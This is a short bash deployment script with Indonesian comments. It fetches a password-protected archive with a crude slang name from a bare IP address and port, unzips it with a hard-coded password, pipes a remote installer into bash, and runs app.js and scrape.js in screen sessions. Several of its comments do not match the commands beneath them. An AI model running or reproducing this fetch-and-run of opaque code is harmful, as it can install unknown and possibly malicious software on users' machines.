#!/bin/bash

# Update dan upgrade
apt update -y
apt upgrade -y
apt install golang-go -y
apt install wget -y

# Git clone ke path tujuan
wget http://98.142.245.14:33650/KONTOL.zip

# Masuk ke dalam folder


# Install unzip
apt install unzip -y

# Unzip file.zip dengan password 123$528
unzip -P 'kontolngaceng123_$#@-+_&)@8;_1($72+_7-27-_7' KONTOL.zip

# Install NVM

# Aktifkan NVM

# Install Node.js menggunakan NVM

# Install npm
apt install npm -y

curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
source ~/.bashrc
nvm install node

# Upgrade npm
npm i npm@latest -g

# Install dependencies
npm i

# Install Screen
apt install screen -y

# Start aplikasi dengan Screen
screen -S app1 node app.js
screen -S app2 node scrape.js

# Tampilkan log
screen -ls
